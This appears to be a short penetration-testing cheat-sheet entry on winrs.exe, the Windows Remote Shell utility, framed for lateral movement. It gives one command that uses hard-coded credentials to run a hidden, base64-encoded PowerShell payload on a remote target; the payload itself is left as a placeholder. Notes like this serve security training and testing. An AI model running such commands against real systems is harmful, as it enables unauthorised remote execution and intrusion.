winrs.exe

WinRS (Windows Remote Shell) is a built-in Windows command-line utility that uses Windows Remote Management (WinRM) to execute commands on remote systems. It enables authenticated users to run commands or applications without establishing an interactive desktop session and is commonly used for remote administration and lateral movement.

Execute Command On The Target

winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e <base64 payload>"
